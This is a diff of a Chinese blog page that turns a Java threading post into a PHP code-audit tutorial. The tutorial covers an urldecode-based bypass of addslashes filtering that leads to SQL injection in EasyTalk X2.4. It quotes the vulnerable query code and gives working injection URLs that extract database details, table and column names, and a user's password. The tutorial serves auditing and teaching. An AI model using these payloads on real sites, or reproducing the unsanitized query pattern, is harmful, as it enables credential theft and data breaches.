@@ -24,7 +24,7 @@
 
 
 
-  <meta name="keywords" content="JAVA,多线程,生产者消费者," />
+  <meta name="keywords" content="PHP,SQL注入,代码审计," />
 
 
 
@@ -49,7 +49,7 @@
 
 
 
-  <title> Java基于queue的多线程模拟生产者消费者问题 // Braid's Blog </title>
+  <title> 【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode // Braid's Blog </title>
 </head>
 
 <body>
@@ -160,7 +160,7 @@
           
           
             
-              Java基于queue的多线程模拟生产者消费者问题
+              【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode
             
           
         </h1>
@@ -168,14 +168,14 @@
 
       <div class="post-meta">
         <span class="post-time">
-          发表于 2015-09-23
+          发表于 2015-12-24
         </span>
 
         
           <span class="post-category">
             &nbsp; | &nbsp; 分类于
             
-              <a href="/categories/编程开发/">编程开发</a>
+              <a href="/categories/WEB安全/">WEB安全</a>
 
               
               
@@ -188,8 +188,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/09/23/producerconsumer/#comments" >
-              <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/23/producerconsumer/"></span>
+            <a href="/2015/12/24/sql1/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2015/12/24/sql1/"></span>
             </a>
           </span>
           
@@ -197,7 +197,7 @@
 		
 		
 		
-	        <span id="/2015/09/23/producerconsumer/"class="leancloud_visitors"  data-flag-title="Java基于queue的多线程模拟生产者消费者问题">
+	        <span id="/2015/12/24/sql1/"class="leancloud_visitors"  data-flag-title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode">
             &nbsp; | &nbsp; 阅读次数
             </span>
           
@@ -210,98 +210,67 @@
       
 
       
-        <h2 id="0x01_并发协作（生产者消费者模型）">0x01 并发协作（生产者消费者模型）</h2><p>对于多线程程序来说，不管任何编程语言，生产者和消费者模型都是最经典的。就像学习每一门编程语言你首先要输出Hello World一样，都是经典的例子。<br>生产者消费者模型准确的讲应该是”生产者-消费者-仓储”模型，离开了仓储这个介质，生产者和消费者也就没有了必然的联系。<br>这里使用queue队列作为仓储，将生产者和消费者联系起来并模拟实现一个简单的多线程并发协作的模型<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/6.JPG" alt=""><br><a id="more"></a></p>
-<h2 id="0x02_基于Queue的生产者消费者模型实现">0x02 基于Queue的生产者消费者模型实现</h2><pre><code>package com.thread;
-
-import java.util.concurrent.BlockingQueue;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.LinkedBlockingQueue;
-
-<span class="comment">/**
- * java基于queue多线程来模拟生产者消费者问题
- * 
- * ProducerConsumer是主类，Producer生产者，Consumer消费者，Queue是商品
- * 
- * @author braid
- * @time 2015-09-23
- */</span>
-<span class="keyword">public</span> <span class="keyword">class</span> ProducerConsumer {
-<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{
-    ProducerConsumer pc = <span class="keyword">new</span> ProducerConsumer();
-    BlockingQueue&lt;String&gt; <span class="built_in">queue</span> = <span class="keyword">new</span> LinkedBlockingQueue&lt;String&gt;(<span class="number">5</span>);
-    ExecutorService service = Executors.newCachedThreadPool();
-    Producer p = pc.new Producer(<span class="string">"王一"</span>, <span class="built_in">queue</span>);
-    Consumer c = pc.new Consumer(<span class="string">"李二"</span>, <span class="built_in">queue</span>);
-    service.submit(p);
-    service.submit(c);
-}
-
-<span class="comment">/**
- * 消费者
- * 
- * @author braid
- * @time 2015-09-23
- */</span>
-<span class="keyword">class</span> Consumer extends Thread {
-    <span class="keyword">private</span> String name;
-    <span class="keyword">private</span> BlockingQueue&lt;String&gt; <span class="built_in">queue</span> = null;
-
-    <span class="function"><span class="keyword">public</span> <span class="title">Consumer</span><span class="params">(String name, BlockingQueue&lt;String&gt; <span class="built_in">queue</span>)</span> </span>{
-        <span class="keyword">this</span>.name = name;
-        <span class="keyword">this</span>.<span class="built_in">queue</span> = <span class="built_in">queue</span>;
+        <h2 id="0x01_背景">0x01 背景</h2><p>现在的WEB程序基本都有对SQL注入的全局过滤，像PHP开启了GPC或者在全局文件common.php上使用addslashes()函数对接收的参数进行过滤，尤其是单引号。遇到这种情况我们就需要找一些编码解码的函数来绕过全局防护，这篇文章讲urldecode()的情况，同样大牛请自觉绕道~<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_1.png" alt=""><br><a id="more"></a></p>
+<h2 id="0x02_环境搭建">0x02 环境搭建</h2><p>看背景我们使用了低版本的easytalk程序，版本为X2.4<br>①源码我打包了一份：<a href="http://pan.baidu.com/s/1bopOFNL" title="easytalk.zip" target="_blank" rel="external">http://pan.baidu.com/s/1bopOFNL</a><br>②解压到www的easytalk目录下，按照提示一步步安装即可，遇到问题自行百度或谷歌，成功后访问如下图：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_2.png" alt=""></p>
+<h2 id="0x03_漏洞分析">0x03 漏洞分析</h2><p>首先看下源码结构，用的ThinkPHP框架，比较复杂：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_3.png" alt=""><br>有兴趣的可以去研究下再继续往下看，新手可以知道ThinkPHP对接收的参数是有过滤的，并且根据你服务器是否开启GPC会做相应的处理：<br>1./ThinkPHP/Extend/Library/ORG/Util/Input.class.php文件第266行：</p>
+<pre><code>/**
+ +----------------------------------------------------------
+ * 如果 magic_quotes_gpc 为关闭状态，这个函数可以转义字符串
+ +----------------------------------------------------------
+ * @access public
+ +----------------------------------------------------------
+ * @param string <span class="variable">$string</span> 要处理的字符串
+ +----------------------------------------------------------
+ * @<span class="keyword">return</span> string
+ +----------------------------------------------------------
+ */
+static public <span class="keyword">function</span> addSlashes(<span class="variable">$string</span>) {
+    if (!get_magic_quotes_gpc()) {
+        <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);
     }
-
-    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>{
-        <span class="keyword">while</span> (<span class="literal">true</span>) {
-            <span class="keyword">if</span> (<span class="built_in">queue</span>.isEmpty())
-                <span class="keyword">break</span>;
-            String product;
-            <span class="keyword">try</span> {
-                product = <span class="built_in">queue</span>.take();
-                System.out.println(name + <span class="string">"消费商品："</span> + product);
-                Thread.sleep(<span class="number">500</span>);
-            } <span class="keyword">catch</span> (InterruptedException e) {
-                <span class="comment">// TODO Auto-generated catch block</span>
-                e.printStackTrace();
+    return <span class="variable">$string</span>;
+}    
+</code></pre><p>2.使用Seay代码审计系统的全局搜索功能，搜索包含关键字为”urldecode”的文件，发现TopicAction.class.php包含一个对接收的参数keyword进行urldecode的地方：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_4.png" alt=""><br>3.我们跟进这个php文件，发现接收keyword就对其进行urldecode转码，然后立即带入查询，造成注入：</p>
+<pre><code>public <span class="keyword">function</span> topic() {
+    <span class="variable">$keyword</span>=<span class="variable">$this-</span>&gt;_get(<span class="string">'keyword'</span>,<span class="string">'urldecode'</span>);//这里对get接收的keyword参数进行urldecode
+    if (<span class="variable">$keyword</span>) {
+        <span class="variable">$topic</span> = D(<span class="string">'Topic'</span>)-&gt;where(<span class="string">"topicname='$keyword'"</span>)-&gt;find();//ok，带入查询了
+        if (<span class="variable">$topic</span>) {
+            <span class="variable">$isfollow</span>=D(<span class="string">'Mytopic'</span>)-&gt;isfollow(<span class="variable">$topic</span>[<span class="string">'id'</span>],<span class="variable">$this-</span>&gt;my[<span class="string">'user_id'</span>]);
+            <span class="variable">$topicusers</span>=D(<span class="string">'MytopicView'</span>)-&gt;where(<span class="string">"topicid='$topic[id]'"</span>)-&gt;order(<span class="string">'id desc'</span>)-&gt;limit(<span class="number">9</span>)-&gt;select();
+            //getwidget
+            <span class="variable">$widget</span>=M(<span class="string">'Topicwidget'</span>)-&gt;where(<span class="string">"topicid='$topic[id]'"</span>)-&gt;order(<span class="string">'`order` ASC'</span>)-&gt;select();
+            if (<span class="variable">$widget</span>) {
+                foreach (<span class="variable">$widget</span> as <span class="variable">$val</span>) {
+                    <span class="variable">$topicwidget</span>[<span class="variable">$val</span>[<span class="string">'widgettype'</span>]][]=<span class="variable">$val</span>;
+                }
             }
-
+            <span class="variable">$this-</span>&gt;assign(<span class="string">'topicwidget'</span>,<span class="variable">$topicwidget</span>);
+        } else {
+            <span class="variable">$count</span>=<span class="variable">$isfollow</span>=<span class="number">0</span>;
         }
+
+        <span class="variable">$this-</span>&gt;assign(<span class="string">'comefrom'</span>,<span class="string">'topic'</span>);
+        <span class="variable">$this-</span>&gt;assign(<span class="string">'keyword'</span>,<span class="variable">$keyword</span>);
+        <span class="variable">$this-</span>&gt;assign(<span class="string">'topic'</span>,<span class="variable">$topic</span>);
+        <span class="variable">$this-</span>&gt;assign(<span class="string">'topicusers'</span>,<span class="variable">$topicusers</span>);
+        <span class="variable">$this-</span>&gt;assign(<span class="string">'isfollow'</span>,<span class="variable">$isfollow</span>);
+        <span class="variable">$this-</span>&gt;assign(<span class="string">'subname'</span>,<span class="string">'#'</span>.<span class="variable">$keyword</span>.<span class="string">'#'</span>);
+        <span class="variable">$this-</span>&gt;display();
+    } else {
+        header(<span class="string">"location:"</span>.SITE_URL.<span class="string">'/?m=topic&amp;a=index'</span>);
     }
 }
-
-<span class="comment">/**
- * 生产者
- * 
- * @author braid
- * @time 2015-09-23
- */</span>
-<span class="keyword">class</span> Producer extends Thread {
-    <span class="keyword">private</span> String name;
-    <span class="keyword">private</span> BlockingQueue&lt;String&gt; <span class="built_in">queue</span> = null;
-
-    <span class="function"><span class="keyword">public</span> <span class="title">Producer</span><span class="params">(String name, BlockingQueue&lt;String&gt; <span class="built_in">queue</span>)</span> </span>{
-        <span class="keyword">this</span>.name = name;
-        <span class="keyword">this</span>.<span class="built_in">queue</span> = <span class="built_in">queue</span>;
-    }
-
-    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>{
-        <span class="comment">//while(true)会造成阻塞，应该根据实际需要设定条件</span>
-        <span class="keyword">while</span> (<span class="literal">true</span>) {
-            String product = <span class="string">"product"</span> + (<span class="keyword">int</span>)(Math.random()*<span class="number">10000</span>);
-            <span class="keyword">try</span> {
-                <span class="built_in">queue</span>.put(product);
-                System.out.println(name + <span class="string">"已生产："</span> + product);
-                Thread.sleep(<span class="number">500</span>);
-            } <span class="keyword">catch</span> (InterruptedException e) {
-                <span class="comment">// TODO Auto-generated catch block</span>
-                e.printStackTrace();
-            }
-        }
-    }
-}
-}
-</code></pre><p>本文由HackBraid整理总结，如需转载请注明出处。</p>
+</code></pre><h2 id="0x04_漏洞证明">0x04 漏洞证明</h2><p>1.我们构造获取数据库相关信息的POC：</p>
+<pre><code><span class="rule"><span class="attribute">http</span>:<span class="value">//localhost/eazytalk/?m=topic&amp;a=topic&amp;keyword=aaa%<span class="number">2527</span> and <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="function">concat</span>(<span class="function">database</span>(),<span class="number">0</span>x5c,<span class="function">user</span>(),<span class="number">0</span>x5c,<span class="function">version</span>()),<span class="number">5</span> %<span class="number">23</span></span></span>
+</code></pre><p>成功获取到信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_7.png" alt=""><br>查看下MySql日志，发现成功执行了sql语句：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_8.png" alt=""><br>2.我们构造获取数据库eazytalk所有表的POC：</p>
+<pre><code><span class="keyword">http</span>://localhost/eazytalk/?m=topic&amp;<span class="operator">a</span>=topic&amp;keyword=aaa%<span class="number">2527</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, (select GROUP_CONCAT(DISTINCT table_name) <span class="built_in">from</span> information_schema.tables where table_schema=<span class="number">0x6561737974616C6B</span>),<span class="number">5</span>%<span class="number">23</span>
+</code></pre><p>成功获取所有表信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_9.png" alt=""><br>4.构造获取表et_users所有字段信息的POC：</p>
+<pre><code><span class="keyword">http</span>://localhost/eazytalk/?m=topic&amp;<span class="operator">a</span>=topic&amp;keyword=aaa%<span class="number">2527</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, (select GROUP_CONCAT(DISTINCT column_name) <span class="built_in">from</span> information_schema.columns where table_name=<span class="number">0x65745F7573657273</span>),<span class="number">5</span>%<span class="number">23</span>
+</code></pre><p>成功获取表et_users所有字段信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_10.png" alt=""><br>5.构造获取et_users表第一条账户的POC：</p>
+<pre><code><span class="keyword">http</span>://localhost/eazytalk/?m=topic&amp;<span class="operator">a</span>=topic&amp;keyword=aaa%<span class="number">2527</span> <span class="operator">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="built_in">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>, (select GROUP_CONCAT(DISTINCT user_name,<span class="number">0x5f</span>,password) <span class="built_in">from</span> et_users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">5</span>%<span class="number">23</span>
+</code></pre><p>成功获取表admin的账户密码如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql01_11.png" alt=""></p>
+<p>本文由HackBraid整理总结，如需转载请联系作者。</p>
 
       
     </div>
@@ -310,11 +279,11 @@ import java.util.concurrent.LinkedBlockingQueue;
       
         <div class="post-tags">
           
-            <a href="/tags/JAVA/"> #JAVA </a>
+            <a href="/tags/PHP/"> #PHP </a>
           
-            <a href="/tags/多线程/"> #多线程 </a>
+            <a href="/tags/SQL注入/"> #SQL注入 </a>
           
-            <a href="/tags/生产者消费者/"> #生产者消费者 </a>
+            <a href="/tags/代码审计/"> #代码审计 </a>
           
         </div>
       
@@ -323,13 +292,11 @@ import java.util.concurrent.LinkedBlockingQueue;
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/12/16/svnExtract/">Java基于queue的多线程提取SVN信息泄露程序</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/07/09/fckeditor/">FCKeditor上传漏洞总结</a>
+              <a href="/2015/12/17/sql0/">【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 1.什么都没过滤的入门情况</a>
             
           </div>
         </div>
@@ -349,8 +316,8 @@ import java.util.concurrent.LinkedBlockingQueue;
     
       <div class="comments" id="comments">
         
-          <div class="ds-thread" data-thread-key="2015/09/23/producerconsumer/"
-               data-title="Java基于queue的多线程模拟生产者消费者问题" data-url="http://hackbraid.github.io/2015/09/23/producerconsumer/">
+          <div class="ds-thread" data-thread-key="2015/12/24/sql1/"
+               data-title="【PHP代码审计实例教程】 那些年我们一起挖掘SQL注入 - 2.全局防护Bypass之UrlDecode" data-url="http://hackbraid.github.io/2015/12/24/sql1/">
           </div>
         
       </div>
@@ -465,7 +432,7 @@ import java.util.concurrent.LinkedBlockingQueue;
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01_并发协作（生产者消费者模型）"><span class="nav-number">1.</span> <span class="nav-text">0x01 并发协作（生产者消费者模型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02_基于Queue的生产者消费者模型实现"><span class="nav-number">2.</span> <span class="nav-text">0x02 基于Queue的生产者消费者模型实现</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01_背景"><span class="nav-number">1.</span> <span class="nav-text">0x01 背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02_环境搭建"><span class="nav-number">2.</span> <span class="nav-text">0x02 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03_漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">0x03 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04_漏洞证明"><span class="nav-number">4.</span> <span class="nav-text">0x04 漏洞证明</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
